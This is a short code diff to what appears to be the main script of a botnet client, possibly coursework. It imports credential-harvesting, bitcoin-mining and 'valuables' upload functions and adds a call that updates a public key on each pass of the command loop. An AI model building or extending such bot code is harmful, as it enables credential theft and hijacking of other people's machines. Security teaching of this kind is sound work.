@@ -5,11 +5,14 @@ import threading
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
+from lib.bot_update_public_key import update_publickey
+
 
 def p2p_upload(fn):
     sconn = find_bot()
     sconn.send(bytes("FILE", "ascii"))
     p2p_upload_file(sconn, fn)
+
 
 def p2p_echo():
     try:
@@ -49,6 +52,9 @@ if __name__ == "__main__":
         # Naive command loop
         # There are better ways to do this, but the code should be clear
         raw_cmd = input("Enter command: ")
+
+        # each time entering the command, the bot will try to update the public key
+        update_publickey()
         cmd = raw_cmd.split()
         if not cmd:
             print("You need to enter a command...")
